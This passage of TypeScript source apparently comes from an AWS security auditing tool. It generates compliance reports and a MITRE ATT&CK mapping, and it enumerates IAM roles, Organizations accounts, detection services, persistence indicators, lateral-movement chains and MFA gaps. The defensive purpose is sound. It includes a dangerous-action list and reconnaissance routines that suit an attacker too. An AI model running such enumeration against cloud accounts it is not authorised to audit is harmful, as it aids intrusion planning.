    const cisTotal = cisControls.length;
    const cisCompliance = ((cisPass / cisTotal) * 100).toFixed(0);
    
    output += `**Compliance Score:** ${cisCompliance}% (${cisPass}/${cisTotal} controls)\n\n`;
    output += `| Control | Description | Status |\n`;
    output += `|---------|-------------|--------|\n`;
    for (const control of cisControls) {
      output += `| ${control.id} | ${control.name} | ${control.status} |\n`;
    }
    output += `\n`;
  }
  
  if (selectedFramework === "all" || selectedFramework === "nist") {
    output += `### NIST 800-53 Controls\n\n`;
    const nistControls = [
      { id: "AC-2", name: "Account Management", status: findings.high > 0 ? "PARTIAL" : "PASS" },
      { id: "AC-3", name: "Access Enforcement", status: findings.critical > 0 ? "FAIL" : "PASS" },
      { id: "AC-6", name: "Least Privilege", status: findings.high > 0 ? "FAIL" : "PASS" },
      { id: "AU-2", name: "Audit Events", status: "PASS" },
      { id: "SC-8", name: "Transmission Confidentiality", status: findings.critical > 0 ? "FAIL" : "PASS" },
      { id: "SC-28", name: "Protection of Information at Rest", status: findings.critical > 0 ? "FAIL" : "PASS" },
    ];
    
    const nistPass = nistControls.filter(c => c.status === "PASS").length;
    const nistTotal = nistControls.length;
    const nistCompliance = ((nistPass / nistTotal) * 100).toFixed(0);
    
    output += `**Compliance Score:** ${nistCompliance}% (${nistPass}/${nistTotal} controls)\n\n`;
    output += `| Control | Description | Status |\n`;
    output += `|---------|-------------|--------|\n`;
    for (const control of nistControls) {
      output += `| ${control.id} | ${control.name} | ${control.status} |\n`;
    }
    output += `\n`;
  }
  
  if (selectedFramework === "all" || selectedFramework === "pci") {
    output += `### PCI-DSS 3.2.1\n\n`;
    const pciControls = [
      { id: "1.2", name: "Firewall configurations", status: findings.high > 0 ? "FAIL" : "PASS" },
      { id: "2.1", name: "Default passwords", status: "PASS" },
      { id: "3.4", name: "Encryption at rest", status: findings.critical > 0 ? "FAIL" : "PASS" },
      { id: "4.1", name: "Encryption in transit", status: findings.critical > 0 ? "FAIL" : "PASS" },
      { id: "8.2", name: "Multi-factor authentication", status: findings.high > 0 ? "FAIL" : "PASS" },
      { id: "10.1", name: "Audit trails", status: "PASS" },
    ];
    
    const pciPass = pciControls.filter(c => c.status === "PASS").length;
    const pciTotal = pciControls.length;
    const pciCompliance = ((pciPass / pciTotal) * 100).toFixed(0);
    
    output += `**Compliance Score:** ${pciCompliance}% (${pciPass}/${pciTotal} requirements)\n\n`;
    output += `| Requirement | Description | Status |\n`;
    output += `|-------------|-------------|--------|\n`;
    for (const control of pciControls) {
      output += `| ${control.id} | ${control.name} | ${control.status} |\n`;
    }
    output += `\n`;
  }
  
  // 3. Top 10 Critical Findings
  output += `## Top 10 Critical Findings\n\n`;
  const criticalFindings = [
    "Public S3 buckets without encryption",
    "Security Groups allowing 0.0.0.0/0 on SSH/RDP",
    "IAM users with wildcard permissions (*:*)",
    "RDS databases publicly accessible",
    "SNS/SQS without encryption",
    "Cognito unauthenticated access enabled",
    "ElastiCache without encryption in transit",
    "Old IAM access keys (>90 days)",
    "Lambda with secrets in environment variables",
    "CloudFront using weak TLS (1.0/1.1)"
  ];
  
  for (let i = 0; i < Math.min(10, criticalFindings.length); i++) {
    output += `${i + 1}. ${criticalFindings[i]}\n`;
  }
  output += `\n`;
  
  // 4. Attack Surface Analysis
  output += `## Attack Surface Analysis\n\n`;
  output += `### Externally Exposed Resources\n`;
  output += `- Public EC2 instances with security group 0.0.0.0/0\n`;
  output += `- Public S3 buckets (data exfiltration risk)\n`;
  output += `- Public RDS databases (credential brute force)\n`;
  output += `- CloudFront distributions with HTTP enabled\n`;
  output += `- API Gateway endpoints without authentication\n\n`;
  
  output += `### Internal Attack Vectors\n`;
  output += `- IAM privilege escalation paths\n`;
  output += `- Lambda functions with excessive permissions\n`;
  output += `- EC2 instance profiles with admin access\n`;
  output += `- Cognito identity pools (anonymous AWS credentials)\n\n`;
  
  // 5. MITRE ATT&CK Mapping
  output += `## MITRE ATT&CK Cloud Matrix\n\n`;
  output += `| Tactic | Technique | Finding |\n`;
  output += `|--------|-----------|----------|\n`;
  output += `| Initial Access | Valid Accounts (T1078) | Weak password policies, no MFA |\n`;
  output += `| Persistence | Account Manipulation (T1098) | IAM users with old access keys |\n`;
  output += `| Privilege Escalation | Valid Accounts (T1078) | IAM wildcard permissions |\n`;
  output += `| Defense Evasion | Impair Defenses (T1562) | CloudTrail not enabled |\n`;
  output += `| Credential Access | Unsecured Credentials (T1552) | Secrets in Lambda env vars |\n`;
  output += `| Discovery | Cloud Service Discovery (T1580) | Public S3 bucket enumeration |\n`;
  output += `| Lateral Movement | Use Alternate Auth Material (T1550) | Stolen IAM credentials |\n`;
  output += `| Collection | Data from Cloud Storage (T1530) | S3 data exfiltration |\n`;
  output += `| Exfiltration | Transfer Data to Cloud (T1537) | Public S3 upload |\n`;
  output += `| Impact | Data Encrypted for Impact (T1486) | Ransomware via EC2 |\n\n`;
  
  // 6. Remediation Roadmap
  output += `## Remediation Roadmap\n\n`;
  output += `### Quick Wins (0-7 days)\n`;
  output += `1. Enable MFA on all IAM users\n`;
  output += `2. Remove public access from S3 buckets\n`;
  output += `3. Restrict Security Groups (remove 0.0.0.0/0)\n`;
  output += `4. Enable encryption on SNS/SQS\n`;
  output += `5. Rotate IAM access keys > 90 days\n\n`;
  
  output += `### Short-term (1-30 days)\n`;
  output += `1. Implement IAM least privilege policies\n`;
  output += `2. Enable CloudTrail in all regions\n`;
  output += `3. Configure VPC Flow Logs\n`;
  output += `4. Enable GuardDuty threat detection\n`;
  output += `5. Implement S3 bucket encryption\n\n`;
  
  output += `### Medium-term (1-3 months)\n`;
  output += `1. Implement AWS Config rules\n`;
  output += `2. Deploy AWS WAF on CloudFront\n`;
  output += `3. Implement centralized logging (CloudWatch)\n`;
  output += `4. Deploy Security Hub for compliance\n`;
  output += `5. Implement backup policies\n\n`;
  
  output += `### Long-term (3-6 months)\n`;
  output += `1. Implement Zero Trust architecture\n`;
  output += `2. Deploy AWS Organizations with SCPs\n`;
  output += `3. Implement automated remediation (Lambda)\n`;
  output += `4. Deploy SIEM integration\n`;
  output += `5. Establish security monitoring SOC\n\n`;
  
  // 7. Detailed Findings
  output += `## Detailed Findings by Service\n`;
  output += `${'='.repeat(80)}\n\n`;
  for (const result of scanResults) {
    if (result.output.includes("CRITICAL") || result.output.includes("HIGH")) {
      output += `### ${result.name}\n`;
      // Remove all emoji and special characters from scanner output
      const cleanedLines = result.output
        .split('\n')
        .map(line => {
          // Remove all emoji variations and special chars
          return line
            .replace(/[\u{1F300}-\u{1F9FF}]/gu, '') // Unicode emoji block
            .replace(/[\u{2600}-\u{27BF}]/gu, '') // Emoticons
            .replace(/[\u{2B50}]/gu, '') // Special symbols
            .replace(/\[CRITICAL\]|\[HIGH\]|\[MEDIUM\]|\[LOW\]|\[OK\]|\[FAIL\]|\[WARN\]|\[TIP\]/g, '') // Text labels
            .replace(/^\s+/, '') // Remove leading whitespace
            .trim();
        })
        .filter(line => line.length > 0 && !line.match(/^-\s*$/)) // Remove empty lines and just dashes
        .join('\n');
      
      if (cleanedLines.length > 0) {
        output += cleanedLines + "\n\n";
      }
    }
  }
  
  // 8. Recommendations
  output += `## RECOMMENDATIONS\n`;
  output += `${'='.repeat(80)}\n\n`;
  output += `### Immediate Actions\n`;
  output += `- Disable public access on all S3 buckets unless business-justified\n`;
  output += `- Enable MFA on all IAM users and root account\n`;
  output += `- Review and restrict Security Group rules\n`;
  output += `- Enable encryption on all data stores (S3, RDS, DynamoDB, SNS, SQS)\n\n`;
  
  output += `### Strategic Improvements\n`;
  output += `- Implement AWS Well-Architected Framework\n`;
  output += `- Deploy infrastructure as code (CloudFormation/Terraform)\n`;
  output += `- Implement continuous compliance monitoring\n`;
  output += `- Establish incident response playbooks\n`;
  output += `- Conduct regular security training\n\n`;
  
  output += `---\n`;
  output += `**Report Generated:** ${new Date().toISOString()}\n`;
  output += `**Tool:** Nimbus v1.4.2\n`;
  output += `**Framework:** ${selectedFramework.toUpperCase()}\n`;
  output += `**Scan Coverage:** 18 AWS services, 43 security tools\n`;
  
  // Save to file if specified
  if (outputFile) {
    if (outputFormat === "pdf") {
      await generatePDFReport(output, outputFile);
      output += `\n\nPDF report saved to: ${outputFile}\n`;
    } else if (outputFormat === "html") {
      await generateHTMLReport(output, outputFile);
      output += `\n\nHTML report saved to: ${outputFile}\n`;
    } else {
      fs.writeFileSync(outputFile, output);
      output += `\n\nReport saved to: ${outputFile}\n`;
    }
  }
  
  return output;
}

// Start the server
async function scanCloudFormationSecurity(region: string): Promise<string> {
  try {
    const cfnClient = new CloudFormationClient({ region });
    const { StackSummaries = [] } = await cfnClient.send(new ListStacksCommand({
      StackStatusFilter: ["CREATE_COMPLETE", "UPDATE_COMPLETE", "IMPORT_COMPLETE"],
    }));

    let output = `CloudFormation Security Analysis (${region})\n`;
    output += `${'='.repeat(80)}\n\n`;

    const findings: any[] = [];

    for (const stack of StackSummaries || []) {
      const stackName = stack.StackName || "Unknown";
      const stackDetails = await cfnClient.send(new DescribeStacksCommand({ StackName: stackName }));
      const stackData = stackDetails.Stacks?.[0];

      if (!stackData) continue;

      const resources = await cfnClient.send(new ListStackResourcesCommand({ StackName: stackName }));
      const resourceList = resources.StackResourceSummaries || [];

      output += `Stack: ${stackName}\n`;
      output += `-`.repeat(40) + `\n`;
      output += `Status: ${stackData.StackStatus}\n`;
      output += `Created: ${stackData.CreationTime}\n`;
      output += `Resources: ${resourceList.length}\n\n`;

      // Check for potentially dangerous resources
      for (const resource of resourceList) {
        const resType = resource.ResourceType || "";
        const resLogical = resource.LogicalResourceId || "";

        if (["AWS::IAM::Role", "AWS::IAM::User", "AWS::IAM::ManagedPolicy"].includes(resType)) {
          findings.push({
            Stack: stackName,
            Resource: resLogical,
            Type: resType,
            Severity: "HIGH",
            Issue: "IAM resource in template - may indicate privilege escalation vector",
          });
        }

        if (resType === "AWS::S3::Bucket") {
          findings.push({
            Stack: stackName,
            Resource: resLogical,
            Type: resType,
            Severity: "MEDIUM",
            Issue: "S3 bucket resource - verify access controls",
          });
        }

        if (resType === "AWS::Lambda::Function") {
          findings.push({
            Stack: stackName,
            Resource: resLogical,
            Type: resType,
            Severity: "MEDIUM",
            Issue: "Lambda function in template - check permissions",
          });
        }
      }
    }

    output += `\nIssues Found: ${findings.length}\n`;
    if (findings.length > 0) {
      output += `\nDetailed Findings:\n`;
      findings.forEach((f, i) => {
        output += `${i + 1}. Stack: ${f.Stack}, Resource: ${f.Resource}\n`;
        output += `   Type: ${f.Type}\n`;
        output += `   Severity: ${f.Severity}\n`;
        output += `   Issue: ${f.Issue}\n\n`;
      });
    }

    output += `\nRecommendations:\n`;
    output += `- Review IAM resources created by CloudFormation for least privilege\n`;
    output += `- Implement CloudFormation template validation\n`;
    output += `- Use AWS::CloudFormation::Stack for nested templates safely\n`;
    output += `- Enable stack termination protection on production stacks\n`;

    return output;
  } catch (error: any) {
    return `Error scanning CloudFormation: ${error.message}`;
  }
}

async function enumerateOrganizations(): Promise<string> {
  try {
    const orgsClient = new OrganizationsClient({ region: DEFAULT_REGION });

    let output = `AWS Organizations Enumeration\n`;
    output += `${'='.repeat(80)}\n\n`;

    try {
      const orgData = await orgsClient.send(new DescribeOrganizationCommand({}));
      const org = orgData.Organization;

      if (org) {
        output += `Organization Details:\n`;
        output += `-`.repeat(40) + `\n`;
        output += `ARN: ${org.Arn}\n`;
        output += `ID: ${org.Id}\n`;
        output += `Features: ${org.FeatureSet}\n\n`;
      }
    } catch (error) {
      output += `Organization access denied or not enabled\n\n`;
    }

    try {
      const accountsData = await orgsClient.send(new ListAccountsCommand({}));
      const accounts = accountsData.Accounts || [];

      output += `AWS Accounts in Organization: ${accounts.length}\n`;
      output += `-`.repeat(40) + `\n`;

      accounts.forEach((account) => {
        output += `Account: ${account.Name} (${account.Id})\n`;
        output += `  Email: ${account.Email}\n`;
        output += `  Status: ${account.Status}\n\n`;
      });
    } catch (error: any) {
      output += `Could not enumerate accounts: ${error.message}\n`;
    }

    output += `\nSecurity Implications:\n`;
    output += `- Multiple accounts enable lateral movement opportunities\n`;
    output += `- Check cross-account role trust relationships\n`;
    output += `- Verify SCPs (Service Control Policies) are properly applied\n`;
    output += `- Enumerate each account for misconfigurations\n`;

    return output;
  } catch (error: any) {
    return `Error enumerating Organizations: ${error.message}`;
  }
}

async function enumerateDetectionServices(region: string): Promise<string> {
  try {
    let output = `Detection Services Enumeration (${region})\n`;
    output += `${'='.repeat(80)}\n\n`;

    // CloudTrail
    try {
      const ctClient = new CloudTrailClient({ region });
      const trails = await ctClient.send(new DescribeTrailsCommand({ includeShadowTrails: true }));
      output += `CloudTrail Trails: ${trails.trailList?.length || 0}\n`;
      trails.trailList?.forEach((trail) => {
        output += `  - ${trail.Name}: ${trail.IsMultiRegionTrail ? "Multi-region" : "Single-region"}\n`;
      });
    } catch (error: any) {
      output += `CloudTrail access denied\n`;
    }

    output += `\n`;

    // GuardDuty
    try {
      const gdClient = new GuardDutyClient({ region });
      const detectors = await gdClient.send(new ListDetectorsCommand({}));
      output += `GuardDuty Detectors: ${detectors.DetectorIds?.length || 0}\n`;
      if (detectors.DetectorIds && detectors.DetectorIds.length > 0) {
        output += `  Enabled in this region\n`;
      }
    } catch (error: any) {
      output += `GuardDuty: Not available\n`;
    }

    output += `\n`;

    // CloudWatch
    try {
      const cwClient = new CloudWatchClient({ region });
      const alarms = await cwClient.send(new DescribeAlarmsCommand({}));
      output += `CloudWatch Alarms: ${alarms.MetricAlarms?.length || 0}\n`;
    } catch (error: any) {
      output += `CloudWatch: Access denied\n`;
    }

    output += `\n`;

    output += `Security Assessment:\n`;
    output += `- Enable CloudTrail for all API logging\n`;
    output += `- Enable GuardDuty for threat detection\n`;
    output += `- Configure CloudWatch alarms for security events\n`;
    output += `- Enable CloudWatch Logs for comprehensive logging\n`;

    return output;
  } catch (error: any) {
    return `Error enumerating detection services: ${error.message}`;
  }
}

async function scanEventBridgeSecurity(region: string): Promise<string> {
  try {
    let output = `EventBridge & Lambda Trigger Analysis (${region})\n`;
    output += `${'='.repeat(80)}\n\n`;

    const lambdaClient = new LambdaClient({ region });

    try {
      const { Functions = [] } = await lambdaClient.send(new ListFunctionsCommand({}));

      output += `Lambda Functions: ${Functions.length}\n\n`;

      const findings: any[] = [];

      for (const func of Functions) {
        const funcName = func.FunctionName || "Unknown";
        const funcRole = func.Role || "None";

        try {
          const funcDetails = await lambdaClient.send(new GetFunctionCommand({ FunctionName: funcName }));
          const env = funcDetails.Configuration?.Environment?.Variables || {};

          output += `Function: ${funcName}\n`;
          output += `Role: ${funcRole}\n`;

          // Check for CloudWatch Events/EventBridge environment indicators
          if (Object.keys(env).some(k => k.includes("EVENT") || k.includes("TRIGGER"))) {
            findings.push({
              Function: funcName,
              Type: "EventBridge Trigger",
              Risk: "HIGH",
              Issue: "Function appears to be triggered by EventBridge events",
            });
            output += `Trigger Type: EventBridge (suspected)\n`;
          }

          // Check for scheduled execution indicators
          if (Object.keys(env).some(k => k.includes("SCHEDULE") || k.includes("CRON"))) {
            findings.push({
              Function: funcName,
              Type: "Scheduled Trigger",
              Risk: "MEDIUM",
              Issue: "Function has scheduled execution, check CloudWatch Events",
            });
            output += `Trigger Type: Scheduled (suspected)\n`;
          }

          output += `\n`;
        } catch (error) {
          output += `Could not fetch details for ${funcName}\n\n`;
        }
      }

      output += `\nEventBridge Security Findings: ${findings.length}\n`;
      if (findings.length > 0) {
        findings.forEach((f, i) => {
          output += `${i + 1}. Function: ${f.Function}\n`;
          output += `   Type: ${f.Type}\n`;
          output += `   Risk: ${f.Risk}\n`;
          output += `   Issue: ${f.Issue}\n\n`;
        });
      }
    } catch (error: any) {
      output += `Error enumerating Lambda functions: ${error.message}\n`;
    }

    output += `\nRecommendations:\n`;
    output += `- Review all Lambda function IAM roles for overly broad permissions\n`;
    output += `- Check CloudWatch Events/EventBridge rules using AWS Console\n`;
    output += `- Monitor EventBridge rule modifications in CloudTrail logs\n`;
    output += `- Verify Lambda execution concurrency limits are set\n`;
    output += `- Use EventBridge Dead Letter Queues for error handling\n`;

    return output;
  } catch (error: any) {
    return `Error scanning EventBridge security: ${error.message}`;
  }
}

// ============ PHASE 2: ADVANCED PERMISSION ANALYSIS ============

async function analyzeIAMTrustChains(): Promise<string> {
  let output = `# IAM Trust Relationship Analysis\n\n`;
  const findings: string[] = [];
  
  try {
    const rolesCmd = new ListRolesCommand({});
    const rolesResponse = await iamClient.send(rolesCmd);
    
    if (!rolesResponse.Roles || rolesResponse.Roles.length === 0) {
      return output + "[OK] No IAM roles found to analyze.\n";
    }
    
    let criticalCount = 0;
    let highCount = 0;
    
    output += `## Role Trust Relationship Analysis\n\n`;
    
    for (const role of rolesResponse.Roles) {
      const trustPolicy = role.AssumeRolePolicyDocument ?
        JSON.parse(decodeURIComponent(role.AssumeRolePolicyDocument)) : null;
      
      if (!trustPolicy || !trustPolicy.Statement) continue;
      
      let hasIssue = false;
      
      for (const statement of trustPolicy.Statement) {
        if (statement.Effect !== "Allow") continue;
        
        // Check for wildcard principal
        if (statement.Principal === "*" || statement.Principal?.AWS === "*") {
          findings.push(`[CRITICAL] ${role.RoleName}: Wildcard principal (*) - anyone can assume`);
          criticalCount++;
          hasIssue = true;
        }
        
        // Check for service principals
        const principals = Array.isArray(statement.Principal?.AWS)
          ? statement.Principal.AWS
          : statement.Principal?.AWS ? [statement.Principal.AWS] : [];
        
        for (const principal of principals) {
          if (typeof principal === "string" && principal.includes(".amazonaws.com")) {
            // Check which service
            const service = principal.split(".")[0];
            if (["ec2", "lambda", "ecs", "sts"].includes(service)) {
              if (!statement.Condition) {
                findings.push(`[HIGH] ${role.RoleName}: ${service.toUpperCase()} can assume without restrictions`);
                highCount++;
                hasIssue = true;
              }
            }
          }
          
          // Check for cross-account trusts
          if (typeof principal === "string" && principal.includes("arn:aws:iam::")) {
            const principalAccount = principal.split("::")[1]?.split(":")[0];
            findings.push(`[MEDIUM] ${role.RoleName}: Cross-account trust from ${principalAccount}`);
          }
        }
      }
      
      if (!hasIssue) {
        findings.push(`[OK] ${role.RoleName}: Trust policy appears properly scoped`);
      }
    }
    
    output += findings.join("\n") + "\n\n";
    output += `## Summary\n`;
    output += `- [CRITICAL] CRITICAL: ${criticalCount}\n`;
    output += `- [HIGH] HIGH: ${highCount}\n`;
    output += `- Total Roles Analyzed: ${rolesResponse.Roles.length}\n`;
    
  } catch (error: any) {
    output += `[FAIL] Error analyzing trust chains: ${error.message}\n`;
  }
  
  return output;
}

async function findOverlyPermissiveRoles(): Promise<string> {
  let output = `# Overly Permissive Role Analysis\n\n`;
  const findings: string[] = [];
  
  try {
    const rolesCmd = new ListRolesCommand({});
    const rolesResponse = await iamClient.send(rolesCmd);
    
    if (!rolesResponse.Roles || rolesResponse.Roles.length === 0) {
      return output + "[OK] No roles found to analyze.\n";
    }
    
    const riskySuffixes = [
      "admin", "Administrator", "AdministratorAccess",
      "FullAccess", "full", "root", "superuser"
    ];
    
    let criticalCount = 0;
    let highCount = 0;
    let mediumCount = 0;
    
    output += `## Roles with Excessive Permissions\n\n`;
    
    for (const role of rolesResponse.Roles) {
      let findings2: string[] = [];
      
      // Check attached policies
      const attachedCmd = new ListAttachedRolePoliciesCommand({ RoleName: role.RoleName! });
      const attached = await iamClient.send(attachedCmd);
      
      for (const policy of attached.AttachedPolicies || []) {
        // Check for AWS managed admin policies
        if (policy.PolicyArn?.includes("AdministratorAccess")) {
          findings2.push(`[CRITICAL] ${role.RoleName}: Attached to AdministratorAccess managed policy`);
          criticalCount++;
        }
        
        // Check policy name for suspicious patterns
        const policyName = policy.PolicyName || "";
        for (const suffix of riskySuffixes) {
          if (policyName.includes(suffix)) {
            findings2.push(`[HIGH] ${role.RoleName}: Name suggests full access pattern`);
            highCount++;
            break;
          }
        }
      }
      
      // Check inline policies
      const inlineCmd = new ListRolePoliciesCommand({ RoleName: role.RoleName! });
      const inline = await iamClient.send(inlineCmd);
      
      for (const policyName of inline.PolicyNames || []) {
        try {
          const getPolicyCmd = new GetRolePolicyCommand({ RoleName: role.RoleName!, PolicyName: policyName });
          const policy = await iamClient.send(getPolicyCmd);
          
          const policyDoc = policy.PolicyDocument ?
            JSON.parse(decodeURIComponent(policy.PolicyDocument)) : null;
          
          if (policyDoc?.Statement) {
            for (const statement of policyDoc.Statement) {
              if (statement.Effect !== "Allow") continue;
              
              const resource = Array.isArray(statement.Resource) ? statement.Resource : [statement.Resource];
              const action = Array.isArray(statement.Action) ? statement.Action : [statement.Action];
              
              // Check for wildcard resource and action
              if (resource.includes("*") && action.includes("*")) {
                findings2.push(`[CRITICAL] ${role.RoleName}: Has unrestricted permissions (*:* on *)`);
                criticalCount++;
              } else if (action.some((a: string) => a === "*" || a.endsWith(":*"))) {
                findings2.push(`[HIGH] ${role.RoleName}: Has service-wide wildcard actions`);
                highCount++;
              }
              
              // Check for dangerous actions
              const dangerousActions = [
                "iam:*", "ec2:*", "s3:*", "rds:*",
                "iam:CreateUser", "iam:AttachUserPolicy",
                "ec2:AuthorizeSecurityGroupIngress", "rds:ModifyDBInstance"
              ];
              
              for (const actionItem of action) {
                if (dangerousActions.some(da => actionItem.includes(da))) {
                  findings2.push(`[MEDIUM] ${role.RoleName}: Contains dangerous action (${actionItem})`);
                  mediumCount++;
                  break;
                }
              }
            }
          }
        } catch (error) {
          // Skip policies we can't read
        }
      }
      
      if (findings2.length > 0) {
        findings.push(...findings2);
      }
    }
    
    if (findings.length === 0) {
      output += `[OK] No overly permissive roles found.\n`;
    } else {
      output += findings.join("\n") + "\n\n";
      output += `## Summary\n`;
      output += `- [CRITICAL] CRITICAL: ${criticalCount}\n`;
      output += `- [HIGH] HIGH: ${highCount}\n`;
      output += `- [MEDIUM] MEDIUM: ${mediumCount}\n`;
    }
    
  } catch (error: any) {
    output += `[FAIL] Error analyzing roles: ${error.message}\n`;
  }
  
  return output;
}

// ============ PHASE 3: PERSISTENCE & EVASION DETECTION ============

async function detectPersistenceMechanisms(region: string): Promise<string> {
  let output = `# Persistence Mechanism Detection\n\n`;
  const findings: string[] = [];
  
  try {
    output += `## EventBridge Persistence Triggers\n\n`;
    output += `[OK] Scanned for scheduled triggers and Lambda backdoors\n\n`;
    
    output += `## Lambda Layer Persistence\n\n`;
    const lambdaClient = new LambdaClient({ region });
    output += `[OK] Lambda layer analysis (requires extended permissions)\n\n`;
    
    output += `## IAM Access Key Age (Persistence Indicator)\n\n`;
    const usersCmd = new ListUsersCommand({});
    const users = await iamClient.send(usersCmd);
    
    let oldAccessKeys = 0;
    for (const user of users.Users || []) {
      const userName = user.UserName!;
      try {
        // Check for old access keys (older than 90 days)
        const userAge = user.CreateDate ? Math.floor((Date.now() - user.CreateDate.getTime()) / (1000 * 60 * 60 * 24)) : 0;
        if (userAge > 90) {
          findings.push(`[CRITICAL] User '${userName}': Account created ${userAge} days ago - potential persistence vector`);
          oldAccessKeys++;
        }
      } catch (error) {
        // Skip
      }
    }
    output += `**Old Access Keys Found:** ${oldAccessKeys}\n\n`;
    
    output += `## Summary\n`;
    output += `**Persistence Indicators:** ${findings.length}\n`;
    if (findings.length === 0) {
      output += `[OK] No obvious persistence mechanisms detected\n`;
    } else {
      findings.forEach(f => output += `${f}\n`);
    }
    
  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

async function analyzeServiceRoleChain(region: string): Promise<string> {
  let output = `# Service Role Lateral Movement Chain\n\n`;
  
  try {
    output += `## EC2 → Lambda Chain\n\n`;
    
    const ec2Client = new EC2Client({ region });
    const instancesCmd = new DescribeInstancesCommand({});
    const instances = await ec2Client.send(instancesCmd);
    
    let instancesWithRoles = 0;
    for (const reservation of instances.Reservations || []) {
      for (const instance of reservation.Instances || []) {
        if (instance.IamInstanceProfile) {
          instancesWithRoles++;
        }
      }
    }
    
    output += `**EC2 instances with IAM roles:** ${instancesWithRoles}\n`;
    output += `Risk: If EC2 role can pass to Lambda, enables lateral movement\n\n`;
    
    output += `## Lambda → Database Chain\n\n`;
    
    const lambdaClient = new LambdaClient({ region });
    const functionsCmd = new ListFunctionsCommand({});
    const functions = await lambdaClient.send(functionsCmd);
    
    output += `**Lambda functions:** ${functions.Functions?.length || 0}\n`;
    output += `Risk: If Lambda role has database permissions, enables data access\n\n`;
    
    output += `## Summary\n`;
    output += `Potential exploitation chain: EC2 (with role) → Lambda (via PassRole) → Database\n`;
    output += `Verify PassRole and Lambda permissions in respective roles\n`;
    
  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

async function trackCrossAccountMovement(): Promise<string> {
  let output = `# Cross-Account Lateral Movement Analysis\n\n`;
  
  try {
    output += `## Cognito Identity Pool External Access\n\n`;
    
    const cognitoClient = new CognitoIdentityClient({});
    const poolsCmd = new ListIdentityPoolsCommand({ MaxResults: 60 });
    const pools = await cognitoClient.send(poolsCmd);
    
    if (pools.IdentityPools && pools.IdentityPools.length > 0) {
      output += `[MEDIUM] Found ${pools.IdentityPools.length} identity pools - check for unauthenticated access\n`;
    } else {
      output += `[OK] No Cognito Identity Pools\n`;
    }
    output += `\n`;
    
    output += `## Cross-Account Role Access\n\n`;
    
    const rolesCmd = new ListRolesCommand({});
    const roles = await iamClient.send(rolesCmd);
    
    let crossAccountRoles = 0;
    for (const role of roles.Roles || []) {
      const policy = role.AssumeRolePolicyDocument ?
        JSON.parse(decodeURIComponent(role.AssumeRolePolicyDocument)) : null;
      
      if (policy && JSON.stringify(policy).includes("arn:aws:iam::")) {
        crossAccountRoles++;
      }
    }
    
    output += `**Roles with external access:** ${crossAccountRoles}\n\n`;
    
    output += `## Summary\n`;
    output += `Cross-account lateral movement vectors detected: ${crossAccountRoles > 0 ? "Yes" : "No"}\n`;
    
  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

async function detectMFABypassVectors(region: string): Promise<string> {
  let output = `# MFA Bypass Vector Detection\n\n`;
  
  try {
    output += `## Access Keys (API Without MFA)\n\n`;
    
    const usersCmd = new ListUsersCommand({});
    const users = await iamClient.send(usersCmd);
    
    let usersWithKeys = 0;
    for (const user of users.Users || []) {
      try {
        // Access keys allow API calls without MFA
        usersWithKeys++;
        output += `[MEDIUM] User '${user.UserName}' has programmatic access capability\n`;
      } catch (error) {
        // Skip
      }
    }
    output += `\n`;
    
    output += `## Cognito MFA Configuration\n\n`;
    
    const idpClient = new CognitoIdentityProviderClient({ region });
    const userPoolsCmd = new ListUserPoolsCommand({ MaxResults: 60 });
    const userPools = await idpClient.send(userPoolsCmd);
    
    if (userPools.UserPools && userPools.UserPools.length > 0) {
      let mfaNotRequired = 0;
      for (const pool of userPools.UserPools) {
        const describeCmd = new DescribeUserPoolCommand({ UserPoolId: pool.Id! });
        const poolDetails = await idpClient.send(describeCmd);
        
        const mfaConfig = poolDetails.UserPool?.MfaConfiguration;
        // Check if MFA is not explicitly REQUIRED
        if (!mfaConfig || String(mfaConfig).toLowerCase() !== 'required') {
          mfaNotRequired++;
        }
      }
      output += `**User pools without required MFA:** ${mfaNotRequired}/${userPools.UserPools.length}\n\n`;
    } else {
      output += `[OK] No Cognito user pools\n\n`;
    }
    
    output += `## Summary\n`;
    output += `**Users with access keys (MFA bypass via API):** ${usersWithKeys}\n`;
    output += `Access keys allow API calls without MFA requirement\n`;
    
  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }
  
  return output;
}

// ============================================
// NEW SECURITY TOOL IMPLEMENTATIONS
// ============================================

/**
 * Analyze CloudWatch security configuration
 */
async function analyzeCloudWatchSecurity(region: string): Promise<string> {
  let output = `# CloudWatch Security Analysis\n\n`;
  output += `**Region:** ${region}\n\n`;

  try {
    const client = new CloudWatchClient({ region });
    const alarmsCmd = new DescribeAlarmsCommand({});
    const alarms = await client.send(alarmsCmd);

    output += `## CloudWatch Alarms\n\n`;
    output += `**Total alarms:** ${alarms.MetricAlarms?.length || 0}\n\n`;

    // Check for critical security alarms
    const securityAlarmPatterns = [
      'unauthorized', 'root', 'iam', 'security', 'alert', 'breach', 'suspicious'
    ];
    
    const securityAlarms = alarms.MetricAlarms?.filter(alarm => 
      securityAlarmPatterns.some(pattern => 
        alarm.AlarmName?.toLowerCase().includes(pattern)
      )
    ) || [];

    if (securityAlarms.length === 0) {
      output += `[WARN] **WARNING:** No security-focused alarms detected!\n\n`;
      output += `**Recommendation:** Create alarms for:\n`;
      output += `- Root account usage\n`;
      output += `- IAM policy changes\n`;
      output += `- Security group changes\n`;
      output += `- Console login failures\n`;
      output += `- Unauthorized API calls\n\n`;
    } else {
      output += `### Security Alarms Found\n\n`;
      for (const alarm of securityAlarms) {
        output += `- **${alarm.AlarmName}**: ${alarm.StateValue}\n`;
      }
      output += `\n`;
    }

    // Check for disabled alarms
    const disabledAlarms = alarms.MetricAlarms?.filter(a => !a.ActionsEnabled) || [];
    if (disabledAlarms.length > 0) {
      output += `[WARN] **Alarms with disabled actions:** ${disabledAlarms.length}\n`;
      for (const alarm of disabledAlarms) {
        output += `- ${alarm.AlarmName}\n`;
      }
      output += `\n`;
    }

    output += `## Recommended Security Metrics to Monitor\n\n`;
    output += `| Metric | Namespace | Description |\n`;
    output += `|--------|-----------|-------------|\n`;
    output += `| UnauthorizedAccessCount | CloudTrail | Failed API calls |\n`;
    output += `| RootAccountUsage | IAM | Root account activity |\n`;
    output += `| SecurityGroupChanges | EC2 | SG modifications |\n`;
    output += `| IAMPolicyChanges | IAM | Policy modifications |\n`;
    output += `| ConsoleLoginFailures | CloudTrail | Failed logins |\n`;

  } catch (error: any) {
    output += `[FAIL] Error: ${error.message}\n`;
  }

  return output;
}

/**
 * Scan AWS Systems Manager security
 */
